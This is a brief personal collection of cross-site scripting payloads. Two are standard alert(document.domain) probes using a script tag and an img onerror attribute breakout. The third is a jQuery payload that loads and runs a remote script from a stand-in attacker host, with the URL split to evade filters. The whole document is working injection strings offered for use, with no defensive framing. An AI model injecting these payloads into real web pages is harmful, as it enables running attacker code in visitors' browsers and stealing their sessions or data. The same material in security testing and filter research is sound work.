# My collection of XSS

## Regular XSS
<script>alert(document.domain)</script>
"><img src=x onerror="alert(document.domain)"/>

## Enaled jQuery
<body onpointerenter="jQuery.getScript('https:/' +'/attackerserver.com/inject.js')">
